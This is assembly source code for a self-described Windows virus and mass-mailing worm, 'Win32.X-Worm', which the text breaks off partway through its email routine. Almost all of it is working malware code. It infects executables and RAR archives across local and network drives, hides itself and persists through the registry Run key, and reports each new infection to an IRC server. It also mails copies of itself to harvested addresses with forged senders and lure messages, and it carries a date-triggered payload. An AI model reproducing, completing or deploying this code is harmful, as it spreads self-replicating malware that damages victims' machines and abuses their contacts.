;-----------------------------------------------------------------------|
; .,::      .:     .::    .   .:::  ...    :::::::..   .        :   	|
;  `;;;,  .,;;     ';;,  ;;  ;;;'.;;;;;;;. ;;;;``;;;;  ;;,.    ;;;  	|
;    '[[,,[['      '[[, [[, [[',[[     \[[,[[[,/[[['  [[[[, ,[[[[, 	|
;     Y$$$Pcccccccc  Y$c$$$c$P $$$,     $$$$$$$$$c    $$$$$$$$"$$$ 	|
;   oP"``"Yo,         "88"888  "888,_ _,88P888b "88bo,888 Y88" 888o	|
;,m"       "Mm,        "M "M"    "YMMMMMP" MMMM   "W" MMM  M'  "MMM	|
;:::::::..-:.     ::-.  :::::::-.  :::::::..  	.,:::::: .-:::::'	|
; ;;;'';;'';;.   ;;;;'   ;;,   `';,;;;;``;;;;	;;;;'''' ;;;'''' 	|
; [[[__[[\. '[[,[[['     `[[     [[ [[[,/[[[' 	 [[cccc  [[[,,== 	|
; $$""""Y$$   c$$"        $$,    $$ $$$$$$ccccccc$$""""  `$$$"``	| 
;_88o,,od8P ,8P"`         888_,o8P' 888b "88bo,	 888oo,__ 888  		|  
;""YUMMMP" mM"            MMMMP"`   MMMM   "W"	 """"YUMMM"MM, 		|
;									|
;-----------------------------------------------------------------------|
;	  	Win32.X-Worm (c) DR-EF 2006				|
;-----------------------------------------------------------------------|
;Virus Name	: Win32.X-Worm						|
;Virus Size	: 40kb							|
;Virus Type	: Polymorphic PE\RAR Infector & Massmailer		|
;Author		: DR-EF							|
;Author Homepage: http://home.arcor.de/dr-ef/				|
;									|
;Virus Features	:							|
;----------------							|
;		1)infect files by injecting loader code and		|
;		  copy itself to the file directory,loader		|
;		  execute the virus,if the virus deleted host		|
;		  wont work anymore					|
;		2)virus is encrypted & polymorphed by 3 layers		|
;		  using VPE,BGPE by BlueOwl/rrlf & ETMS by		|
;		  b0z0/ikx  engines,the pe header of the virus		|
;		  file is changble too					|
;		3)virus can add itself to .rar archives			|
;		4)virus find kernel32 base by using SEH walker		|
;		5)scan all drivers from c~z to find files		|
;		6)does not infect sfc protected files & files		|
;		  with names of av programs				|
;									|
;Mail Worm Features:							|
;-------------------							|
;		1)x-worm got its own smtp engine & base64 encoder	|
;		2)find mails at txt,html,rtf,doc,dbx,php,jsp,cgi	|
;		  files							|
;		3)using email-ripper engine published in 29a#6		|
;		4)using word creation engine by BlueOwl			|
;		5)fake sender address					|
;		6)2 types of mails					|
;									|
;General Malware Features:						|
;-------------------------						|
;		1)add itself to system startup				|
;		2)use mutex to avoid 2 executions at the same time	|
;		3)destructive payload					|
;		4)notify at irc for every new infection			|
;		5)run as service process under win9x/me			|
;									|
;Source Code Features:							|
;---------------------							|
;		1)Debug Version Switch					|
;									|
;To Compile:								|
;-----------								|
;									|
;	tasm32 /m3 /ml /zi xworm.asm , , ;				|
;	tlink32 /tpe /aa /v xworm , xworm,,import32.lib			|
;									|
;-----------------------------------------------------------------------|


.586
.model flat




	extrn GetProcAddress:proc


	DEBUG		equ	0			;debug version ?

	
	VirusSizeX4	equ	(((virus_end-virus_start)+3)/4)*4
	VirusSizeX1	equ	(virus_end-virus_start)
	data_sec_size	equ	(virus_end-x_main)

.data


x_main:

	Decryptor2	db	1024*6	dup(90h)


virus_start	equ	$


	call	xdelta
xdelta:	pop	ebp
	sub	ebp,offset xdelta
	
        mov 	eax,fs:[0]				;find kernel using SEH walker
search_last:
        mov 	edx,[eax]
        inc 	edx
        jz 	found_last
        dec 	edx
        xchg 	edx,eax
        jmp 	search_last
found_last:
        mov 	eax,[eax+4]
        and 	eax,0ffff0000h
search_mz:
        cmp 	word ptr [eax],'ZM'
        jz 	found_mz
        sub 	eax,10000h
        jmp 	search_mz
found_mz:
	mov	[ebp + kernel32base],eax
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[ebp + kernel32base]
	;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[ebp + kernel32base]
	mov	edi,[eax]
	add	edi,[ebp + kernel32base]
	;edi - api names array
	cld
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax
	;eax - kernel32 export table
	;edx - GetProcAddress position
	shl	edx,1h
	mov	ebx,[eax + 24h]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[ebp + kernel32base]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[ebp + kernel32base]
	mov	[ebp + __GetProcAddress],ebx
	
	mov	edx,[ebp + kernel32base]
	mov	ecx,NumberOfApis
IF	DEBUG
	inc	ecx
ENDIF
	lea	ebx,[ebp + ApiAddressTable]
	lea	eax,[ebp + ApiNamesTable]
	clc
	call	GetNextAPI				;start to get apis using a lookup table
	jc	@2
	ret
@2:	call	prsp
	db	"RegisterServiceProcess",0
prsp:	push	[ebp + kernel32base]
	call	[ebp +  __GetProcAddress]
	or	eax,eax
	je	no_rsp
	push	1
	push	0
	call	eax					;hide our process on win9x/me
no_rsp:	clc	

	call	GenMorphedWorm				;create a polymorphed encrypted worm	
	jnc	ExitWorm

	call	GetUser32Apis				;get apis from user32 library
	call	GetWinsockApis				;get apis from winsock library
	call	GetADVAPI32Apis				;get apis from advapi32 library
	
	;load sfc library & get IsFileProtected api
	
	mov	[ebp + SfcIsFileProtected],0h		;assume no sfc
	lea	eax,[ebp + SFC_DLL]
	push	eax
	call	[ebp + LoadLibrary]			;load sfc library
	or	eax,eax					;sfc here ?
	je	NoSfc					;we not under xp\2000
	lea	ebx,[ebp + _SfcIsFileProtected]
	push	ebx
	push	eax					;sfc module handle
	call	[ebp + __GetProcAddress]
	or	eax,eax					;function not founded ?
	je	NoSfc
	mov	[ebp + SfcIsFileProtected],eax		;save function address	
NoSfc:	

	call	AllowOnlyOneRun				;run the worm only 1 time
	jnc	ExitWorm
	
;add autorun key/send notify message
;*************************************************

	call	SetAutoRun
			
;check for payload day
;*************************************************

	mov	byte ptr [ebp + PayloadDay],0h

	lea	eax,[ebp + SYSTEMTIME]
	push	eax
	call	[ebp + GetLocalTime]
	
	cmp	word ptr [ebp + wDay],29d
	jne	NoPayLoad
	
	inc	byte ptr [ebp + PayloadDay]		;killing flag

NoPayLoad:

;scan all drivers from c ~ z for .exe & .rar files
;*************************************************

	mov	byte ptr [ebp + StartDrive],'z'		;set start drive
	
InfectNxtDrive:
	
	;check if drive is remote or fixed
	
	
	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + GetDriveType]
	cmp	eax,DRIVE_FIXED
	je	InfectIt
	cmp	eax,DRIVE_REMOTE
	jne	SkipDrive
InfectIt:

IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + DriveInfectionWarning]
	push	eax
	lea	eax,[ebp + StartDrive]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	SkipDrive
ENDIF	

	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	je	SkipDrive

	call	InfectDrive

SkipDrive:	
	dec	byte ptr [ebp + StartDrive]
	cmp	byte ptr [ebp + StartDrive],'b'
	
	jne	InfectNxtDrive
	
	cmp	byte ptr [ebp + PayloadDay],1h
	jne	MassMail
	
	push	MB_ICONINFORMATION
	lea	eax,[ebp + CopyRight]
	push	eax
	push	eax
	push	0h
	call	[ebp + MessageBox]			;show payload MessageBox	

MassMail:

	push	(5*1000)
	call	[ebp + Sleep]				;sleep for 5 minutes
	
	mov	byte ptr [ebp + use_rar_file],0h

	call	GenRandomNumber
	cmp	al,80h
	ja	@UseRar

	call	CreateVirusBase64Image
	jnc	ExitWorm
	
	jmp	WSASup
	
@UseRar:mov	byte ptr [ebp + use_rar_file],1h
	call	CreateVirusRarFile
	call	CreateVirusBase64Image
	jnc	ExitWorm

WSASup:	lea	eax,[ebp + WSADATA]
	push	eax
	push	VERSION1_1
	call	[ebp + WSAStartup]			;start up winsock
	cmp	eax,0h
	jne	ExitWorm
	
	mov	byte ptr [ebp + StartDrive],'z'		;set start drive
		
SearchNxtDrive:
	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + GetDriveType]
	cmp	eax,DRIVE_FIXED
	je	ScanIt
	cmp	eax,DRIVE_REMOTE
	jne	_SkipDrive
ScanIt:	lea	eax,[ebp + StartDrive]
	push	eax
	call	[ebp + SetCurrentDirectory]
	or	eax,eax
	je	_SkipDrive
	call	ScanDrive
_SkipDrive:
	dec	byte ptr [ebp + StartDrive]
	cmp	byte ptr [ebp + StartDrive],'b'
	jne	SearchNxtDrive	
	
	call	[ebp + WSACleanup]
	
	push	[ebp + base64outputmem]
	call	[ebp + GlobalFree]

ExitWorm:
	push	eax
	call	[ebp + ExitProcess]				;we done
	
	
SetAutoRun:

	push	0ffh
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + GetWindowsDirectory]			;get windows directory
	lea	edi,[ebp + auturun_copy_path]
nextWC:	cmp	byte ptr [edi],0h
	je	SFP
	inc	edi
	jmp	nextWC
SFP:	lea	esi,[ebp + worm_file]
	mov	ecx,SizeOfWormFile
	rep	movsb
	
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + GetFileAttributes]
	and	eax,FILE_ATTRIBUTE_READONLY
	cmp	eax,FILE_ATTRIBUTE_READONLY
	je	NoNotify
		
	call	overTIx
	dd	0
overTIx:xor	eax,eax	
	push	eax
	push	eax
	lea	ebx,[ebp + InfectionNotify]
	push	ebx
	push	eax
	push	eax
	
	call	[ebp + CreateThread]	
	
NoNotify:
	push	0h
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	lea	eax,[ebp + MorphedWorm]
	push	eax
	call	[ebp + CopyFile]				;copy worm file
	
	push	FILE_ATTRIBUTE_HIDDEN
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + SetFileAttributes]			;hide it
	
	lea	eax,[ebp + hkey]
	push	eax
	push	KEY_WRITE
	push	0h
	lea	eax,[ebp + runkey]
	push	eax
	push	HKEY_LOCAL_MACHINE
	call	[ebp + RegOpenKeyEx]				;open key
	cmp	eax,ERROR_SUCCESS
	jne	ExtAt
	
	push	SizeOFACP
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	push	REG_SZ
	push	0h
	lea	eax,[ebp + auturun_name]
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegSetValueEx]				;setup autorun value
	
	push	[ebp + hkey]
	call	[ebp + RegCloseKey]				;done !
	
ExtAt:	ret
	
	auturun_name	db	"x32x",0h
	
	worm_file:
		db	"\xwrm.exe",0h
		SizeOfWormFile	equ	($-worm_file)	
	
	
	auturun_copy_path:
		db	0ffh	dup(0)
		SizeOFACP	equ	($-auturun_copy_path)
	
	hkey		dd	0
	
	runkey	db	"Software\Microsoft\Windows\CurrentVersion\Run",0h
	
	HKEY_LOCAL_MACHINE	equ	80000002h
	ERROR_SUCCESS		equ	0h
	KEY_WRITE		equ	00020006h
	REG_SZ			equ	1h
	
	
InfectionNotify:

	call	Ndelta
Ndelta:	pop	ebp
	sub	ebp,offset Ndelta
	
	lea	eax,[ebp + WSADATA2]
	push	eax
	push	VERSION1_1
	call	[ebp + WSAStartup]			;start up winsock
	cmp	eax,0h
	jne	ExitNotify
	push	IPPROTO_TCP
	push	SOCK_STREAM
	push	AF_INET
	call	[ebp + socket]				;create socket
	cmp	eax,SOCKET_ERR
	je	ExitNotify
	mov	dword ptr [ebp + nsocket],eax
	push	6667					;irc
	call	[ebp + htons]
	
	mov	word ptr [ebp + sin_port_],ax
	mov	word ptr [ebp + sin_family_],AF_INET
	lea	eax,[ebp + irc_server_addr]
	push	eax
	call	[ebp + gethostbyname]
		
	or	eax,eax
	je	EN_Cs
	mov	eax,dword ptr [eax + HOSTENT_IP]
	mov	eax,dword ptr [eax]
	mov	eax,dword ptr [eax]
	mov	dword ptr [ebp + sin_addr_],eax
	push	SizeOfSOCKADDR_
	lea	eax,[ebp + SOCKADDR2]
	push	eax
	push	dword ptr [ebp + nsocket]
	call	[ebp + connect]
	or	eax,eax
	jne	EN_Cs

	push	(2*1000)
	call	[ebp + Sleep]	

	mov	ecx,3h
	lea	edi,[ebp + iuser]
@grnds:	push	ecx
	mov	ecx,7h
@rndl:	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@rndl
	mov	byte ptr [edi],0h
	inc	edi
	pop	ecx
	loop	@grnds

	lea	eax,[ebp + irealname]
	push	eax
	lea	eax,[ebp + iuser]
	push	eax
	call	puser
	db	"USER %s 8 * :%s",0dh,0ah,0h
puser:	lea	eax,[ebp + ircbuffer]
	push	eax
	call	[ebp + wsprintf]
	
	add	esp,(4*4)
	
	push	0h
	push	eax
	lea	eax,[ebp + ircbuffer]
	push	eax
	push	[ebp + nsocket]
	call	[ebp + send]
	
	lea	eax,[ebp + inick]
	push	eax
	call	pnick
	db	"NICK %s",0dh,0ah,0h
pnick:	lea	eax,[ebp + ircbuffer]
	push	eax
	call	[ebp + wsprintf]
	
	add	esp,(3*4)
	
	push	0h
	push	eax
	lea	eax,[ebp + ircbuffer]
	push	eax
	push	[ebp + nsocket]
	call	[ebp + send]	
		
	mov	ecx,4h
@GetPng:push	ecx
	
	call	_xrecv
	or	eax,eax
	je	EN_Cs
	cmp	eax,SOCKET_ERR
	je	EN_Cs
	
	mov	ecx,eax
	sub	ecx,4h
	lea	eax,[ebp + xGetBuffer]
	
@FindPing:
	cmp	dword ptr [eax],"GNIP"
	je	ProcessPng
	inc	eax
	loop	@FindPing
	pop	ecx
	loop	@GetPng
	jmp	EN_Cs

ProcessPng:
	pop	ecx

	add	eax,6h
	mov	esi,eax
	lea	edi,[ebp + xpong]
	
cpypb:	cmp	byte ptr [esi],0dh
	je	endPc
	movsb
	jmp	cpypb
	
endPc:	mov	byte ptr [edi+1],0h

	lea	eax,[ebp + xpong]
	push	eax
	call	ppong
	db	"PONG %s",0dh,0ah,0h
ppong:	lea	eax,[ebp + ircbuffer]
	push	eax
	call	[ebp + wsprintf]
	
	add	esp,(3*4)
				
	push	0h
	push	eax
	lea	eax,[ebp + ircbuffer]
	push	eax
	push	[ebp + nsocket]
	call	[ebp + send]		
	
	call	_xrecv
	or	eax,eax
	je	EN_Cs
	cmp	eax,SOCKET_ERR
	je	EN_Cs
	
	mov	ecx,xSizeOfGB
	
	lea	eax,[ebp + xGetBuffer]	
@fWelcome:
	cmp	dword ptr [eax],"100 "
	je	ConSucc
	cmp	byte ptr [eax],0dh
	je	EN_Cs
	inc	eax
	dec	ecx
	cmp	ecx,0h
	jne	@fWelcome
	jmp	EN_Cs
	
ConSucc:push	0h
	push	SizeOfJOIN
	call	O_J
xjoin	db	"JOIN #england",0dh,0ah
	SizeOfJOIN	equ	($-xjoin)
O_J:	push	dword ptr [ebp + nsocket]
	call	[ebp + send]
	
	push	1000
	call	[ebp + Sleep]

	push	0h
	push	SizeOfPMSG
	call	O_P
xpmsg	db	"PRIVMSG #england :.-:[X-Worm]:-.",0dh,0ah
	SizeOfPMSG	equ	($-xpmsg)
O_P:	push	dword ptr [ebp + nsocket]
	call	[ebp + send]	
	
	push	1000
	call	[ebp + Sleep]
		
	push	0h
	push	SizeOfQUIT
	call	O_Q
xquit	db	"QUIT .-:[X-Worm]:-.",0dh,0ah
	SizeOfQUIT	equ	($-xquit)
O_Q:	push	dword ptr [ebp + nsocket]
	call	[ebp + send]
		
	push	1000
	call	[ebp + Sleep]	
	
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN
	lea	eax,[ebp + auturun_copy_path]
	push	eax
	call	[ebp + SetFileAttributes]			;hide it	
	
EN_Cs:	push	dword ptr [ebp + nsocket]
	call	[ebp + closesocket]
ExitNotify:
	push	eax
	call	[ebp + ExitThread]
	
_xrecv:	push	0h
	push	xSizeOfGB
	call	PushGBx
	xSizeOfGB	equ	(PushGBx-$)
	xGetBuffer	db	0200h	dup(0)
PushGBx:push	dword ptr [ebp + nsocket]
	call	[ebp + recv]
	ret	
	
	xpong			db	32d	dup(0)
	
	iuser			db	8d	dup(0)
	inick			db	8d	dup(0)
	irealname		db	8d	dup(0)
	
	
	ircbuffer		db	0ffh	dup(0)
	
	irc_server_addr		db	"irc.undernet.org",0h
	
	
	nsocket		dd	0
	
	
WSADATA2:	
	mVersion_	dw	0
	mHighVersion_	dw	0
	szDescription_	db	257 dup(0)
	szSystemStatus_	db	129 dup(0)
	iMaxSockets_	dw	0
	iMaxUpdDg_	dw	0
	lpVendorInfo_	dd	0	
	
	
SOCKADDR2:
	sin_family_	dw	0	
	sin_port_	dw	0
	sin_addr_       dd      0       
	sin_zero_	db	8 dup(0)
	SizeOfSOCKADDR_	equ	($-SOCKADDR2)		
	
	
	
AllowOnlyOneRun:
	;use mutex to check if we already running
	lea	eax,[ebp + CopyRight]
	push	eax
	push	0h
	push	MUTEX_ALL_ACCESS
	call	[ebp + OpenMutex]
	cmp	eax,0h
	jne	AlreadyRun
	lea	eax,[ebp + CopyRight]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + CreateMutex]
	stc
	ret
AlreadyRun:
	clc
	ret
	
	MUTEX_ALL_ACCESS	equ	001F0001h
	
	
	
	
SYSTEMTIME:
	wYear		dw	0
	wMonth		dw	0
	wDayOfWeek	dw	0
	wDay		dw	0
	wHour		dw	0
	wMinute		dw	0
	wSecond		dw	0
	wMilliseconds	dw	0	
	
	
	PayloadDay		db	0
	

;MailAddr	 = reciver mail
;vsocket	 = smtp server connection socket
;use_rar_file 	 = send rar/exe file ?
;base64outputmem = base64 encoded worm
;sizeofbase64out = size of base64 data
TransferWorm:
	call	__recv						;recive welcome message
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 022"
	jne	Disconnect
	push	0h
	push	SizeOfHELO
	call	O_HL
xhelo	db	"HELO <localhost>",0dh,0ah
	SizeOfHELO	equ	($-xhelo)
O_HL:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv					;get helo response
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 052"		;is 250 ?
	jne	Disconnect
	
	mov	ecx,SizeOfBoundary
	lea	edi,[ebp + boundry]
@x_RndLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@x_RndLetter			;generate boundary id

	call	GenRandomNumber
	cmp	al,80h				;select mail type
	ja	m2
	mov	byte ptr [ebp + MailType],1h	;failed sending msg
	jmp	m_x
m2:	mov	byte ptr [ebp + MailType],0h	;love letter msg
m_x:	cmp	byte ptr [ebp + MailType],1h
	jne	LoveMsg
	
	call	GenRandomNumber
	
	and	eax,7000h
	cmp	eax,1000h
	ja	mf1
	lea	esi,[ebp + frm1]
	jmp	GenMF
mf1:	cmp	eax,2000h
	ja	mf2
	lea	esi,[ebp + frm2]
	jmp	GenMF
mf2:	cmp	eax,3000h
	ja	mf3
	lea	esi,[ebp + frm3]
	jmp	GenMF
mf3:	cmp	eax,4000h
	ja	mf4
	lea	esi,[ebp + frm4]
	jmp	GenMF
mf4:	cmp	eax,5000h
	ja	mf5
	lea	esi,[ebp + frm5]
	jmp	GenMF
mf5:	cmp	eax,6000h
	ja	mf6
	lea	esi,[ebp + frm6]
	jmp	GenMF
mf6:	lea	esi,[ebp + frm7]
GenMF:	lea	edi,[ebp + faked_mfrm]
	xor	ecx,ecx
nxtmfb:	cmp	byte ptr [esi+ecx],0h
	je	cpymf
	inc	ecx
	jmp	nxtmfb
cpymf:	inc	ecx
	rep	movsb
	dec	edi
	lea	esi,[ebp + MailAddr]
NxtDmc:	cmp	byte ptr [esi],'@'
	je	getDom
	inc	esi
	jmp	NxtDmc
getDom:	cmp	byte ptr [esi+ecx],0h
	je	CpyDom
	inc	ecx
	jmp	getDom
CpyDom:	inc	ecx
	rep	movsb
	
	push	4000h					;allocate 16kb of memory used 
	push	GPTR					;as dynamic mail buffer
	call	[ebp + GlobalAlloc]			
	or	eax,eax
	je	QuitM
	
	mov	[ebp + MailBuffer],eax			;save allocated memory handle
	
	lea	eax,[ebp + faked_mfrm]
	push	eax	
	call	PushMf	
	db	"MAIL FROM:<%s>",0dh,0ah,0h
PushMf:	push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create MAIL FROM command
	add	esp,(3*4)
	
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	lea	eax,[ebp + MailAddr]
	push	eax	
	call	PushRC
	db	"RCPT TO:<%s>",0dh,0ah,0h
PushRC:	push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create RCPT command
	add	esp,(3*4)

	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
		
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	push	0h
	push	SizeOfDATA
	call	O_DT
xDATA	db	"DATA",0dh,0ah
	SizeOfDATA	equ	($-xDATA)
O_DT:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]					;send DATA command
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv						;get data response
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 453"		;is 354 ?
	jne	Disconnect
	
	;generate message in memory
	
	mov	ecx,2h
	
@xfn:	cmp	byte ptr [ebp + use_rar_file],1h
	jne	sexe
	lea	esi,[ebp +rar_suffix]
	jmp	___z
sexe:	lea	esi,[ebp +exe_suffix]
___z:	push	esi	
	
	cmp	ecx,2h
	jne	NotRnd
	call	GenRandomNumber
	
	and	eax,7000h
NotRnd:	cmp	eax,1000h
	ja	xat1
	lea	esi,[ebp + atch1]
	jmp	PFn
xat1:	cmp	eax,2000h
	ja	xat2
	lea	esi,[ebp + atch2]
	jmp	PFn
xat2:	cmp	eax,3000h
	ja	xat3
	lea	esi,[ebp + atch3]
	jmp	PFn
xat3:	cmp	eax,4000h
	ja	xat4
	lea	esi,[ebp + atch4]
	jmp	PFn
xat4:	cmp	eax,5000h
	ja	xat5
	lea	esi,[ebp + atch5]
	jmp	PFn
xat5:	cmp	eax,6000h
	ja	xat6
	lea	esi,[ebp + atch6]
	jmp	PFn
xat6:	lea	esi,[ebp + atch7]

PFn:	push	esi
	
	dec	ecx
	cmp	ecx,0h
	jne	@xfn					;2 times file + suffix
	
	lea	eax,[ebp + boundry]
	push	eax					;boundary
	
	call	GenRandomNumber
	
	and	eax,6000h
	cmp	eax,1000h
	ja	x_msg1
	lea	esi,[ebp + msg1]
	jmp	Pmsg
x_msg1:	cmp	eax,2000h
	ja	x_msg2
	lea	esi,[ebp + msg2]
	jmp	Pmsg
x_msg2:	cmp	eax,3000h
	ja	x_msg3
	lea	esi,[ebp + msg3]
	jmp	Pmsg
x_msg3:	cmp	eax,4000h
	ja	x_msg4
	lea	esi,[ebp + msg4]
	jmp	Pmsg
x_msg4:	cmp	eax,5000h
	ja	x_msg5
	lea	esi,[ebp + msg5]
	jmp	Pmsg
x_msg5:	lea	esi,[ebp + msg6]
Pmsg:	push	esi					;message
	
	lea	eax,[ebp + boundry]
	push	eax					;boundary
		
	lea	eax,[ebp + boundry]
	push	eax					;boundary
			
	call	GenRandomNumber
	
	and	eax,3000h
	cmp	eax,1000h
	ja	x_sub1
	lea	esi,[ebp + sub1]
	jmp	Psub
x_sub1:	cmp	eax,2000h
	ja	x_sub2
	lea	esi,[ebp + sub2]
	jmp	Psub
x_sub2:	lea	esi,[ebp + sub3]
Psub:	push	esi					;subject
	
	lea	eax,[ebp + MailAddr]
	push	eax					;mail to
	
	lea	eax,[ebp + faked_mfrm]
	push	eax					;mail from
	
	lea	eax,[ebp + MailHeader]
	push	eax					;formated string
	
	push	[ebp + MailBuffer]
	
	call	[ebp + wsprintf]			;create mime message
	
	add	esp,(13*4)				;restore stack
		
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]	

	jmp	SndAtt
	
LoveMsg:
	call	GenRandomNumber
	mov	ecx,6h
	push	ecx
	lea	edi,[ebp + faked_mfrm]
@x__RndLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@x__RndLetter
	lea	edi,[ebp + faked_mfrm]
	pop	ecx
	add	edi,ecx
	lea	esi,[ebp + MailAddr]
NxtDmc_:cmp	byte ptr [esi],'@'
	je	getDom_
	inc	esi
	jmp	NxtDmc_
getDom_:cmp	byte ptr [esi+ecx],0h
	je	CpyDom_
	inc	ecx
	jmp	getDom_
CpyDom_:inc	ecx
	rep	movsb
	
	push	4000h					;allocate 16kb of memory used 
	push	GPTR					;as dynamic mail buffer
	call	[ebp + GlobalAlloc]			
	or	eax,eax
	je	QuitM
	
	mov	[ebp + MailBuffer],eax			;save allocated memory handle
	
	lea	eax,[ebp + faked_mfrm]
	push	eax	
	call	PushMf_
	db	"MAIL FROM:<%s>",0dh,0ah,0h
PushMf_:push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create MAIL FROM command
	add	esp,(3*4)
	
	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	lea	eax,[ebp + MailAddr]
	push	eax	
	call	PushRC_
	db	"RCPT TO:<%s>",0dh,0ah,0h
PushRC_:push	dword ptr [ebp + MailBuffer]
	call	[ebp + wsprintf]			;create RCPT command
	add	esp,(3*4)

	push	0h
	push	eax
	push	[ebp + MailBuffer]
	push	[ebp + vsocket]
	call	[ebp + send]

	cmp	eax,SOCKET_ERR
	je	ExitFm
	call	__recv					;get server message:
	cmp	eax,SOCKET_ERR
	je	ExitFm
	cmp	eax,0h
	je	ExitFm
	cmp	dword ptr [ebp + GetBuffer]," 052"	;is 250 ?
	jne	ExitFm

	push	0h
	push	SizeOfDATA
	call	O_DT_
	db	"DATA",0dh,0ah
O_DT_:	push	dword ptr [ebp + vsocket]
	call	[ebp + send]					;send DATA command
	cmp	eax,SOCKET_ERR
	je	Disconnect
	call	__recv						;get data response
	cmp	eax,SOCKET_ERR
	je	Disconnect
	or	eax,eax
	je	Disconnect
	cmp	dword ptr [ebp + GetBuffer]," 453"		;is 354 ?
	jne	Disconnect
	
	;generate message in memory
	
	mov	ecx,2h
	
@xfn_:	cmp	byte ptr [ebp + use_rar_file],1h
	jne	sexe_
	lea	esi,[ebp +rar_suffix]
	jmp	___z_
sexe_:	lea	esi,[ebp +exe_suffix]
___z_:	push	esi	
	
	cmp	ecx,2h
	jne	NotRnd_
	call	GenRandomNumber
	
	and	eax,8000h
NotRnd_:cmp	eax,1000h
	ja	xat1_
	lea	esi,[ebp + xattch1]
	jmp	PFn_
xat1_:	cmp	eax,2000h
	ja	xat2_
	lea	esi,[ebp + xattch2]
	jmp	PFn_
xat2_:	cmp	eax,3000h
	ja	xat3_
	lea	esi,[ebp + xattch3]
	jmp	PFn_
xat3_:	cmp	eax,4000h
	ja	xat4_
	lea	esi,[ebp + xattch4]
	jmp	PFn_
xat4_:	cmp	eax,5000h
	ja	xat5_
	lea	esi,[ebp + xattch5]
	jmp	PFn_
xat5_:	cmp	eax,6000h
	ja	xat6_
	lea	esi,[ebp + xattch6]
	jmp	PFn_
xat6_:	cmp	eax,7000h
	ja	xat7_
	lea	esi,[ebp + xattch7]
	jmp	PFn_
xat7_:	lea	esi,[ebp + xattch8]

PFn_:	push	esi
	
	dec	ecx
	cmp	ecx,0h
	jne	@xfn_					;2 times file + suffix
	
	lea	eax,[ebp + boundry]
	push	eax					;boundary
	
	call	GenRandomNumber
	
	and	eax,0d000h
	cmp	eax,1000h
	ja	x_msg1_
	lea	esi,[ebp + xmsg1]
	jmp	Pmsg_
x_msg1_:cmp	eax,2000h
	ja	x_msg2_
	lea	esi,[ebp + xmsg2]
	jmp	Pmsg_
x_msg2_:cmp	eax,3000h
	ja	x_msg3_
	lea	esi,[ebp + xmsg3]
	jmp	Pmsg_
x_msg3_:cmp	eax,4000h
	ja	x_msg4_
	lea	esi,[ebp + xmsg4]
	jmp	Pmsg_
x_msg4_:cmp	eax,5000h
	ja	x_msg5_
	lea	esi,[ebp + xmsg5]
	jmp	Pmsg_
x_msg5_:cmp	eax,6000h
	ja	x_msg6_
	lea	esi,[ebp + xmsg6]
	jmp	Pmsg_
x_msg6_:cmp	eax,7000h
	ja	x_msg7_
	lea	esi,[ebp + xmsg7]
	jmp	Pmsg_
x_msg7_:cmp	eax,8000h
	ja	x_msg8_
	lea	esi,[ebp + xmsg6]
	jmp	Pmsg_
x_msg8_:cmp	eax,9000h
